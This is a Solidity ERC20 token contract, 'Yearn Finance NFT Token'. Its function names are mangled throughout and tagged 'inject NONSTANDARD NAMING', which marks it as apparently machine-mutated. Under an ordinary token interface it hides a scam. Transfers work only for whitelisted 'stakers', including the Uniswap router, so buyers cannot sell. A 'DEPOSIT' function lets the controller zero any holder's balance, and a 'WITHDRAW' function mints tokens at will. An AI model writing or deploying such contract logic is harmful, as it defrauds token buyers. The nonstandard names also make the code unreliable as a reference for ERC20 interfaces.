                                                                 

                                                                 

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY94() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF685(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER530(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE542(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE286(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM476(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER466(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL858(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    function _MSGSENDER949() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY94() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF685(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER530(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _ONSET186(_MSGSENDER949(), recipient, amount);
        return true;
    }
    function ALLOWANCE542(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE286(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE805(_MSGSENDER949(), spender, amount);
        return true;
    }
    function TRANSFERFROM476(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _ONSET186(sender, recipient, amount);
        _APPROVE805(sender, _MSGSENDER949(), _allowances[sender][_MSGSENDER949()].SUB709(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE379(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE805(_MSGSENDER949(), spender, _allowances[_MSGSENDER949()][spender].ADD84(addedValue));
        return true;
    }
    function DECREASEALLOWANCE316(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE805(_MSGSENDER949(), spender, _allowances[_MSGSENDER949()][spender].SUB709(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _ONSET186(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB709(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD84(amount);
        emit TRANSFER466(sender, recipient, amount);
    }
    function _INITMINT641(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD84(amount);
        _balances[account] = _balances[account].ADD84(amount);
        emit TRANSFER466(address(0), account, amount);
    }
    function _BURN724(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB709(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB709(amount);
        emit TRANSFER466(account, address(0), amount);
    }
    function _WITHDRAW185(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD84(amount);
        _balances[account] = _balances[account].ADD84(amount);
    }
    function _DEPOSIT954(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE805(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL858(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME349() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL748() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS401() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD84(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB709(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB709(a, b, "SafeMath: subtraction overflow");
    }
    function SUB709(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL703(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV664(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV664(a, b, "SafeMath: division by zero");
    }
    function DIV664(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YearnFinanceNFTToken is ERC20, ERC20Detailed {
  address public uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  using SafeMath for uint;
  mapping (address => bool) public controller;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("Yearn Finance NFT Token", "yf-NFT", 18) {
      _INITMINT641( msg.sender, 1000*10**uint(DECIMALS401()) );
      controller[msg.sender] = true;
      stakers[msg.sender] = true;
      stakers[uniV2Router] = true;
  }
  function DEPOSIT59(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _DEPOSIT954(account);
  }
  function WITHDRAW500(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _WITHDRAW185(account, amount);
  }
  function _ONSET186(address from_, address to_, uint amount) internal {	//inject NONSTANDARD NAMING
    require(stakers[from_], 'unauthorized');
    super._ONSET186(from_, to_, amount);
  }
  function _STAKE679(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = true;
  }
  function _LOGREBASE640(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = false;
  }
}